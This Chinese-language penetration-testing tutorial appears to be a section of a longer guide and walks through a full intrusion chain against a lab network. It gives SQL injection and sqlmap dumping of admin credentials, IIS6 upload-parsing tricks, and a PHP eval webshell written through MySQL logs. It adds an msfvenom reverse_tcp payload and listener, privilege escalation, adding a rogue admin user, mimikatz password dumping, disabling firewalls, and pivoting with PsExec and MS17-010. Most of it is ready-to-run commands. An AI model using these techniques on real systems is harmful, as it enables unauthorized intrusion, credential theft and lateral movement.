3.2.1 sql注入漏洞


（sql注入有很多种判断方法和利用，我这里只说一点点，过waf的也不说，有兴趣的同学可以去百度搜索更多技巧学习）

最简单的，在信息交互页面URL后面加上 ’看是否出错，判断有无注入。若出错继续手工尝试 and 1=2 。



确定报错后可以使用手工逐字拆解法，获取后台管理员账号密码，具体使用方法如下（只要返回页面正常，就说明猜解的是对的）：

猜解表名：and exists (select*from 表名)

猜解列名：and exists ( select 列名 from 表名)

猜解字段长度：and (select top 1 len (列名) from 表名)=数字（字段长度）

利用asc和mid函数，判断第N位字段长度（97代表‘a’的ascll值）：

and （select top 1 asc(mid(列名,N,1))from 表名）=97

（上述一个个猜嫌麻烦话，可以用burp的爆破模块跑字典）

最后得出16位或32位ascll值组成的MD5可以去https://www.somd5.com/网站解密。



如果你想省时间，可以用傻瓜式注入检测工具：啊D，他的原理也是基于逐字拆解法的。



或者专业一点用sqlmap，常用的语法为：

检测数据库名：sqlmap -u "页面有数据交互的网址" --dbs

检测表名：sqlmap -u "页面有数据交互的网址" -D 数据库名 --tables

检测列名：sqlmap -u "页面有数据交互的网址" -D 数据库名 -T 表名 --columns

猜解字段：sqlmap -u "页面有数据交互的网址" -D 数据库名 -T 表名 -C “列名” --dump


获得账号密码就可以寻找后台尝试登录。

3.3.1 利用IIS中间件漏洞getshell后提权

（此段getshell参考https://bbs.zkaq.cn/?t/158.html简写）

直接找上传点，毕竟getshell是需要在服务器的WWW文件夹里面放一段恶意代码（一句话木马）的。




此系统使用iis6.0的中间件，可能存在以下IIS解析漏洞:

目录解析

以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。

文件解析

对于 *.asp;.jpg 像这种畸形文件名在";"后面的直接被忽略，也就是说当成 *.asp文件执行。

默认文件解析

IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa *.cer *.cdx

最后发现可上传cer文件，于是把图片马名字改为cer上传，成功上传。用菜刀连接上传成功的路径，进入文件目录界面。



但发现c盘文件无法访问，打开菜刀的虚拟终端输入了whoami指令，查看我当前的身份，还是发现拒绝访问。



此时可用菜刀上传一个cmd.exe，然后文件上右键打开“虚拟终端”。再次输入whoami命令，但是从返回结果看，目前只是一个普通用户，想添加用户权限还是不够。




这是因为使用cmd需要用到外部接口wscript.shell。但是wscript.shell仍然在C盘，C盘我们仍然无法访问。那么就只能再上传一个已经组装好的wscript.shell，也就是下图的iis6.exe。（exp程序可以自己在网上或去国外exp库找）



IIS6.exe文件上右键打开“虚拟终端”，通过iis6.exe执行了whoami命令--iis6.exe "whoami"，已经看出它已经给了我system的命令行权限。



于是，我再次尝试通过--iis6.exe “net user pig 123 /add”添加pig用户，此时，这条命令就成功了。然后继续用iis6.exe "net localgroup Administrators pig /add"指令向管理员用户组成功添加了pig用户。



到上面这一步理论上已经是系统最高权限了，你可以看情况利用iis6.exe关闭防火墙和开启3389远程端口，实现桌面控制。



最后，请必须打开任务管理器，以注销的方式离开

3.3.3 利用phpMyAdmin getshell 后metasploit提权

先说一下测试环境，如下图：


首先，这里已经拿下后台了。比较要关注网站的绝对路径，因为要把webshell恶意代码放在这个目录下面。



在后台页面sql输入框内，通过shell命令开启mysql的日志功能

命令：set global general_log = on;



开启后指定日志文件位置，因为这网址是php搭建的，所以路径下命名也要是php后缀

命令：set global general_log_file = “c:/phpstudy/www/test123.php”



然后写段一句话木马的请求语句，在网站日志记录的时候，就会把恶意代码记录进去。

命令：select ‘<?php eval($_POST[“a”]);?>’



通过蚁剑连接刚才新建的test123.php，获取网站目录



（这测试里有个大前提：蚁剑连接后的虚拟终端的权限可以使用普通用户命令）



这里的提权是指利用metasploit生成一个payload.exe并打开监听模块。

payload.exe生成命令，生成后在kali的root目录下能找到：

msfvenom -p windows/meterpreter/reverse_tcp lhost=（kali ip地址） lport=4444 -f exe >load_kali.exe



Kali打开metasploit监听模块命令：

msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set lhost 192.168.1.3

run



把payload.exe文件用蚁剑上传到getshell的服务器，并在虚拟终端运行。成功让服务器对metasploit进行反向连接，继续通过“shell”命令，就能进入web服务器的cmd。



“background”命令 在getshell后能返回原来的模块



“sessions -l”命令 是查看连接会话数和用户名信息

“sessions -l 2”命令 是选择你想要连接的会话



“getuid”命令 查看建立好会话连接的权限是什么



“getsystem”命令 metasploit会自己识辨什么系统，能自动提升到更高的权限（不是百分百的）



你以为完成了吗，其实还有很重要一步，就是收集本机的账号密码，而且是明文的哦！

“ps”命令查看服务器进程



我们这里打算使用mimikatz获取账号密码，一共有三步。


第1步是

把我们上传到服务器的load_kali.exe进程权限转移到别的高权限进程里面。移到其他进程里面有几个条件就是要选64位的和system的，然后记下它的PID（比如432）。



“migrate 432”命令 把load_kali.exe进程PID 1836转移到winlogon.exe进程PID 432上

（提醒，这里很容易显示出错，但是不要紧，因为它等于把这个进程的代码转移到另一个进程的代码上，所以只要按照上面步骤重新来就行，要多尝试几次。

“background”命令返回，“run”开始监听， 蚁剑运行exe，“getsystem”命令，“ps”命令，“migrate 432”命令）



“load mimikatz”命令 把工具载入成功，然后通过工具的

“mimikatz_command -f sekurlsa::searchPasswords”命令读取账号密码



理论上到这一步已经是最高权限了，登不登远程桌面都无所谓了，不过为了一条龙思路，还是选择继续说。

在测试环境这台服务器有防火墙，开了3389但是我们kali是扫不到这个端口的，所以我们先来关闭防火墙。


“shell”命令 进入cmd的system权限

“netstat -ano | findstr “3389””命令 查看服务器的3389端口有没有开



“netsh firewall set opmode mode=disable”命令 关闭防火墙（其实不一样的Windows系统关闭防火墙的命令也有点差异，可以自己百度搜一下）



发现kali可以telnet通3389了，打开远程登录，输入账号密码进入（这里是模拟外网环境，所以登录账号要记得加上域）

内网渗透


继续上面的这个测试环境为例，如下图：


现在已经入侵VM1 win7服务器，想要继续向VM2和VM3内网渗透，VM1就必须做跳板。


做跳板就要先建立路由，我们查看一下win7有哪些路由，在meterpreter输入


“run get_local_subnets”命令 查看路由



这里也可以利用“arp -a”命令查看内网网段都有哪些主机ip，从而后期继续渗透（不过这个可能不全，时间不急的话还是用扫描模块吧）



发现192.168.52.0的内网路由，现在要把这路由添加进去


“run autoroute -s 192.168.52.0/24”命令 添加路由地址

“run autoroute -p”命令 查看添加的路由地址



如果没有做这个路由跳转的话，你metasploit是扫描不到内网端口的，现在在meterpreter输入“background”命令返回模块界面，


“search portscan”命令 查询扫描模块

“use auxiliary/scanner/portscan/tcp”命令 加载扫描模块

“set rhosts 192.168.52.141”命令 设置扫描对象ip（这里是设置扫VM2 win2003的ip）

“set ports 445”命令 设置你要扫描的端口

“run”命令 开始扫描


meterpreter里是有专门的端口扫描模块，大家要记住了！



扫描完后，我们想啊，之前不是收集到win7的账号密码吗，那能不能试一下登录内网别的服务器呢，这时我们需要一个工具帮忙连接这两台服务器。

其实远程连接不止3389，可以用psexec.exe工具连接（网上有下载），这是一个Windows系统自己的工具，其实可以通过445的smb服务器建立远程连接。




我们把下载好的psexec.exe通过蚁剑上传到win7服务器的网站目录下面，然后回到win7的远程桌面cmd或者meterpreter的shell里，输入


“PsExec.exe \\192.168.52.141 -u administrator -p mchz@2020 whoami”命令

意思是，软件+要连接的内网VM2服务器+user的账号名+pass的密码+你想执行的命令




测试成功，如果把命令后面改成“cmd”， 会把对方的cmd回显过来，使用“ipconfig”看一下，确定是vm2的服务器！



现在已经拿到vm2 win2003的服务器了，说心里话，其实很多时候企业内网服务器也会存在统一密码的现象，建议企业网络管理员要多多留意。


接下来对最后一台内网vm3 win2008服务器192.168.52.138进行最后的进攻了。

我们再换种方式渗透，首先我们发现在win 2008服务器上不能正常使用psexec.exe，重新回到之前建好路由的meterpreter里，使用端口扫描模块

可以看到vm3的445端口是开着的，尝试永恒之蓝漏洞模块扫描一下吧，

“set rhosts 192.168.52.138”命令 设置对象ip（这里是设置VM3 win2008的ip）

我们看到win2008服务器有可能存在永恒之蓝漏洞的，这里继续换exp攻击模块正向连接。


“search ms17-010”命令 查询ms17-010模块

发现攻击失败，可能是有防火墙，怎么办呢？

首先要想方法把防火墙关掉，在meterpreter里继续输入

“set command whoami”命令 先设置command使用的是“whoami”这个命令试一下

“run”命令 开始尝试命令执行



发现“whoami”命令被成功执行，接下来我们换关闭防火墙的命令（因为Windows版本不同，使用可能关闭防火墙的命令也有些差异，大家可以自行百度一下）


“set command Netsh firewall set opmode mode=disable”命令



由于编码的问题所以看到很多？号，但命令是被执行成功了，现在我们重新用exp攻击模块正向连接。

“run”命令 开始攻击

总结


一般网络环境有两种，一种是工作组，一种是域环境。

工作组里，每台主机都是独立的，互不关联的。

而这次最后的内网渗透是模拟域环境搭建的。在域环境里最重要的就是域管理员的账号密码，它是可以登录域环境里所有的服务器。所以域环境渗透最关键就在于，怎样能拿到域服务器上面管理员的账号密码。
